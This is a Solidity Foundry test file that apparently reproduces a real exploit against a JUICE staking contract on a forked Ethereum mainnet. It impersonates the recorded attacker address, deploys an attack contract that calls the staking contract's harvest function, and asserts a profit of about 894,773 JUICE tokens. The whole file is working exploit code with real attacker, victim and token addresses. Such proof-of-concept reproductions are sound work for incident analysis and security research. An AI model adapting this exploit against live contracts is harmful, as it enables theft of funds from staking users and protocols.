
pragma solidity ^0.8.20;

import {Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.ATTACKER_EOA;
    address constant ATTACK_CONTRACT = Addresses.ATTACK_CONTRACT;
    uint256 constant FORK_BLOCK = 19395643;
    uint256 constant TX_TIMESTAMP = 1709964419;
    uint256 constant TX_BLOCK_NUMBER = 19395644;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchAttackRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _etchAttackRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.ATTACK_CONTRACT, attack, Addresses.JUICE, "JUICE", 894773055846326585466130);
    }
}

contract OurAttack {
    bytes4 constant ATTACK_ENTRY_SIG = 0x6d7fe2d8;

    function attack() external payable {
        _harvestJuice();
    }

    function _harvestJuice() internal {
        IJuiceStaking(Addresses.JUICE_STAKING).harvest(0);
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.sig == ATTACK_ENTRY_SIG) {
            _harvestJuice();
            return;
        }
    }
}

library Addresses {
    address internal constant ATTACKER_EOA = 0x3fA19214705BC82cE4b898205157472A79D026BE;
    address internal constant JUICE_STAKING = 0x8584DdbD1E28bCA4bc6Fb96baFe39f850301940e;
    address internal constant ATTACK_CONTRACT = 0xa8b45dEE8306b520465f1f8da7E11CD8cFD1bBc4;
    address internal constant JUICE = 0xdE5d2530A877871F6f0fc240b9fCE117246DaDae;
}

interface IJuiceStaking {
    function harvest(uint256 poolId) external;
}
